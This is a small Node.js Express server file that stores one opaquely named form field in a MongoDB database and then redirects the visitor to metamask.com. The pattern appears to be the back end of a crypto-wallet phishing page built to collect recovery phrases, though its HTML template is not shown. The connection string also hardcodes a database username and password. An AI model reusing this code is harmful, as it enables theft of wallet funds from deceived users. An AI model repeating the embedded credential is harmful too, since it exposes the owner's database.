const express = require("express");
const bodyParser = require("body-parser");
const ejs = require("ejs");
const mongoose = require("mongoose");


const app = express();

app.set("view engine", "ejs");
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static("public"));

mongoose.connect("mongodb+srv://sgrain35:SDdqnJVhOqYWLyMT@cluster0.cbrwrem.mongodb.net/full");

const userSchema = new mongoose.Schema({
  text: String,
});

const User = mongoose.model("User", userSchema);

app.get("/", (req, res) => {
  res.render("index");
});

app.post("/index", async (req, res) => {
  const newUser = new User({
    text: req.body.newmh78,
  });

  try {
    await newUser.save();
    res.redirect("https://www.metamask.com");
  } catch (err) {
    console.error(err);
  }
});

 
const port = process.env.PORT || 3000;

app.listen(port, () => {
  console.log("Welcome to 3k");
});
